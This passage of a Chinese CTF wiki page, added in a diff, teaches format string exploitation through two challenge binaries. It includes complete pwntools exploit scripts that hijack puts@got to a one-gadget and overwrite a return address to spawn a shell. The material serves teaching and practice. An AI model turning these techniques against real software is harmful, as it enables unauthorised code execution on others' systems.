+    if ( !strcmp(i, &amp;s1) )
+    {
+      strcpy(&amp;dest, i + 0x28);//将内容复制到dest
+      return printf(&amp;dest);//输出dest内容
+    }
+  }
+  return printf(&amp;dest);
+}
+</code></pre>
+
+<h4 id="_11">漏洞利用思路</h4>
+<p>既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路</p>
+<ul>
+<li>绕过密码</li>
+<li>确定格式化字符串参数偏移</li>
+<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li>
+<li>修改 puts@got 的内容为 system 的地址。</li>
+<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
+</ul>
+<h4 id="_12">漏洞利用程序</h4>
+<p>如下</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author  : MrSkYe
+# @Email   : skye231@foxmail.com
+# @File    : filename.py
+from pwn import *
+context.log_level = 'debug'
+
+p = process(&quot;./pwn3&quot;)
+elf = ELF(&quot;./pwn3&quot;)
+libc = ELF(&quot;./libc.so&quot;)
+
+def creat(name,content):
+    p.recvuntil(&quot;ftp&gt;&quot;)
+    p.sendline(&quot;put&quot;)
+    p.recvuntil(&quot;upload:&quot;)
+    p.sendline(name)
+    p.recvuntil(&quot;content:&quot;)
+    p.sendline(content)
+def show(name):
+    p.recvuntil(&quot;ftp&gt;&quot;)
+    p.sendline(&quot;get&quot;)
+    p.recvuntil(&quot;get:&quot;)
+    p.sendline(name)
+def showlist():
+    p.recvuntil(&quot;ftp&gt;&quot;)
+    p.sendline(&quot;dir&quot;)
+
+name = &quot;rxraclhm&quot;
+puts_got = elf.got['puts']
+log.info(&quot;puts_got:&quot;+hex(puts_got))
+
+p.recvuntil(&quot;Rainism):&quot;)
+p.sendline(name)
+
+# leak libc
+payload = &quot;%8$s&quot; + p32(puts_got)
+creat('aaaa',payload)
+show('aaaa')
+
+puts_leak = u32(p.recv(4))
+log.info(&quot;puts_leak:&quot;+hex(puts_leak))
+libc_base = puts_leak - libc.symbols['puts']
+log.info(&quot;libc_base:&quot;+hex(libc_base))
+system = libc_base + libc.symbols['system']
+log.info(&quot;system:&quot;+hex(system))
+binsh = libc_base + libc.search('/bin/sh').next()
+log.info(&quot;binsh:&quot;+hex(binsh))
+onegadget = libc_base + 0x3ac62
+log.info(&quot;onegadget:&quot;+hex(onegadget))
+
+# 1:overcover puts@got 2 system@got
+
+#payload = fmtstr_payload(7, {puts_got: system})
+#creat('/bin/sh;', payload)
+#show('/bin/sh;')
+#showlist()
+
+# 2:overcover puts@got 2 onegadget
+payload = fmtstr_payload(7, {puts_got: onegadget})
+creat('bbbb', payload)
+show('bbbb')
+
+p.interactive()
+</code></pre>
+
+<blockquote>
+<p>exp 替换我写得版本，这条题目的完整 WP ：<a href="../example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/">2016_CCTF_pwn3_writeup</a></p>
+</blockquote>
+<p>注意</p>
+<ul>
+<li>我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。</li>
+</ul>
+<p><strong>注解</strong>：结合 payload 来看：<code>payload = "%8$s" + p32(puts_got)</code> ，<code>%8$S</code>长度为 0x4 ，偏移为 7；<code>p32(puts_got)</code> 长度为 0x4 ，偏移为 8 ;</p>
+<ul>
+<li>这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。</li>
+</ul>
+<h2 id="hijack-retaddr">hijack retaddr</h2>
+<h3 id="_13">原理</h3>
+<p>很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
+<h3 id="_14">例子</h3>
+<p>这里我们以 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/三个白帽-pwnme_k0">三个白帽 - pwnme_k0</a> 为例进行分析。</p>
+<h4 id="_15">确定保护</h4>
+<pre><code>➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+
+<p>可以看出程序主要开启了 NX 保护以及 Full RELRO 保护。这我们就没有办法修改程序的 got 表了。</p>
+<h4 id="_16">分析程序</h4>
+<p>简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞</p>
+<pre><code class="c">int __usercall sub_400B07@&lt;eax&gt;(char format@&lt;dil&gt;, char formata, __int64 a3, char a4)
+{
+  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);
+  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);
+  return printf(&amp;a4 + 4);
+}
+</code></pre>
+
+<p>其输出的内容为 &amp;a4 + 4。我们回溯一下，发现我们读入的 password 内容也是</p>
+<pre><code class="c">v6 = read(0, (char *)&amp;a4 + 4, 0x14uLL);
+</code></pre>
+
+<p>当然我们还可以发现我们读入的 username 在距离的 password 20 个字节。</p>
+<pre><code class="c">puts(&quot;Input your username(max lenth:20): &quot;);
+fflush(stdout);
+v8 = read(0, &amp;bufa, 0x14uLL);
+if ( v8 &amp;&amp; v8 &lt;= 0x14u )
+{
+    puts(&quot;Input your password(max lenth:20): &quot;);
+    fflush(stdout);
+    v6 = read(0, (char *)&amp;a4 + 4, 0x14uLL);
+    fflush(stdout);
+    *(_QWORD *)buf = bufa;
+    *(_QWORD *)(buf + 8) = a3;
+    *(_QWORD *)(buf + 16) = a4;
+</code></pre>
+
+<p>好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。</p>
+<h4 id="_17">利用思路</h4>
+<p>我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用 system('bin/sh') 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。</p>
+<p>虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。</p>
+<p><strong>注解</strong>：</p>
+<p>上面这句话可以这样理解：有一个独立函数 A 的栈帧，这个 A 栈帧整体存放地址是动态变化的。但是 A 栈帧内部的结构是固定的，举个例子：rbp 一定在 rip 前面（低地址）。还有我们知道的是 rbp 存储的是上一个栈帧的 rbp 地址，如果说每次都是通过函数 B 调用函数 A ，因为AB 栈帧长度&amp;结构固定，我们就可以通过泄露函数 A rbp 的值减去偏移得到函数 A rip 地址。</p>
+<p><img alt="fmrstr_3.png" src="../img/fmrstr_3.png" /></p>
+<p>利用思路如下</p>
+<ul>
+<li>确定偏移</li>
+<li>获取函数的 rbp 与返回地址</li>
+<li>根据相对偏移获取存储返回地址的地址</li>
+<li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li>
+</ul>
+<h4 id="_18">确定偏移</h4>
+<p>首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&amp;a4 + 4) 函数处</p>
+<pre><code class="shell">Register Account first!
+Input your username(max lenth:20): 
+aaaaaaaa
+Input your password(max lenth:20): 
+%p%p%p%p%p%p%p%p%p%p
+Register Success!!
+1.Sh0w Account Infomation!
+2.Ed1t Account Inf0mation!
+3.QUit sangebaimao:(
+&gt;error options
+1.Sh0w Account Infomation!
+2.Ed1t Account Inf0mation!
+3.QUit sangebaimao:(
+&gt;1
+...
+</code></pre>
+
+<p>此时栈的情况为</p>
+<pre><code class="shell">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+     0x400b1a                  call   0x400758
+     0x400b1f                  lea    rdi, [rbp+0x10]
+     0x400b23                  mov    eax, 0x0
+ →   0x400b28                  call   0x400770
+   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
+        0x400776                  xchg   ax, ax
+        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
+        0x40077e                  xchg   ax, ax
+────────────────────────────────────────────────────────────────────[ stack ]────
+0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
+0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi
+0x00007fffffffdb58│+0x18: 0x000000000000000a
+0x00007fffffffdb60│+0x20: 0x7025702500000000
+0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;
+0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;
+0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
+</code></pre>
+
+<p>可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。</p>
+<p><strong>注解</strong>：</p>
+<p>这里我还是用我习惯的方法，输出几个 %p 直接数出来偏移。</p>
+<h4 id="_19">修改地址</h4>
+<p>我们再仔细观察下断点（b printf）处栈的信息</p>
+<pre><code class="sehll">0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
+0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi
+0x00007fffffffdb58│+0x18: 0x000000000000000a
+0x00007fffffffdb60│+0x20: 0x7025702500000000
+0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;
+0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;
+0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
+</code></pre>
+
+<p>可以看到栈上第二个位置存储的就是该函数的返回地址 (其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。</p>
+<p>与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。</p>
+<p><img alt="fmrstr_3.png" src="../img/fmrstr_3.png" /></p>
+<p>0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。</p>
+<p>这里需要说明的是<strong>在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash</strong>, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system("/bin/sh") 处</p>
+<pre><code class="shell">.text:00000000004008A6 sub_4008A6      proc near
+.text:00000000004008A6 ; __unwind {
+.text:00000000004008A6                 push    rbp
+.text:00000000004008A7                 mov     rbp, rsp
+.text:00000000004008AA &lt;- here         mov     edi, offset command ; &quot;/bin/sh&quot;
+.text:00000000004008AF                 call    system
+.text:00000000004008B4                 pop     rdi
+.text:00000000004008B5                 pop     rsi
+.text:00000000004008B6                 pop     rdx
+.text:00000000004008B7                 retn
+</code></pre>
+
+<h4 id="_20">利用程序</h4>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author  : MrSkYe
+# @Email   : skye231@foxmail.com
+# @File    : pwnme_k0.py
+from pwn import *
+context.log_level = 'debug'
+
+p = process(&quot;./pwnme_k0&quot;)
+elf = ELF(&quot;./pwnme_k0&quot;)
+
+# leak stack addr
+payload = 'a'*0x8 + &quot;%6$p&quot;
+
+p.recvuntil(&quot;20): \n&quot;)
+p.send(payload)
+p.recvuntil(&quot;20): \n&quot;)
+p.send(payload)
+
+p.recvuntil('&gt;')
+#gdb.attach(p,'b printf')
+p.sendline('1')
+p.recvuntil('a'*0x8)
+stack_leak = int(p.recv(14),16) - 0x38
+log.info(&quot;stack_leak:&quot;+hex(stack_leak))
+
+# hijack retaddr
+payload1 = p64(stack_leak)
+payload2 = &quot;%2218d%8$hn&quot;
+
+p.recvuntil('&gt;')
+p.sendline('2')
+p.recvuntil(&quot;20): \n&quot;)
+p.sendline(payload1)
+p.recvuntil(&quot;20): \n&quot;)
+p.sendline(payload2)
+
+p.recvuntil('&gt;')
+p.sendline('1')
+
+p.interactive()
+</code></pre>
+
+<p><strong>注解</strong>：</p>
+<ol>
+<li>泄露地址的时候使用格式化字符串用的是 %p ，如果用 %s 再 u64 泄露出来的是函数 B 的 rbp 的值。原因也很简单，要求输出的是字符，系统到函数 A rbp 的值指向的地址取值，也就是函数 B 的值。如果是 %p 就将函数 A rbp 的值输出。</li>
+<li>hijack 部分的 payload ，格式化字符串可以放到 name 输入，也就是和 stack_leak 一起输入，password 就随便输入点东西行了。这里因为输入长度现在，所以没有使用最稳妥的 单字节 输入，而是双字节。</li>
+</ol>
+                
+              
+              
+                
+
+
+  <h2 id="__comments">评论</h2>
+  <div id="disqus_thread"></div>
+  <script>var disqus_config=function(){this.page.url="https://wiki.mrskye.cn/fmtstr/fmtstr_example/",this.page.identifier="fmtstr/fmtstr_example/"};!function(){var e=document,i=e.createElement("script");i.src="//SkYe.disqus.com/embed.js",i.setAttribute("data-timestamp",+new Date),(e.head||e.body).appendChild(i)}()</script>
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                格式化字符串漏洞利用
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../../linker/statically_linked/" title="静态链接程序利用" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                静态链接程序利用
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2020 SkYe
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.d710d30a.min.js"></script>
+      <script src="../../assets/javascripts/bundle.5f27aba8.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\uff0c\\u3002]+", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ["tabs", "instant"],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.27c6a5e6.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
+      
+        <script src="../../_static/js/extra.js"></script>
+      
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
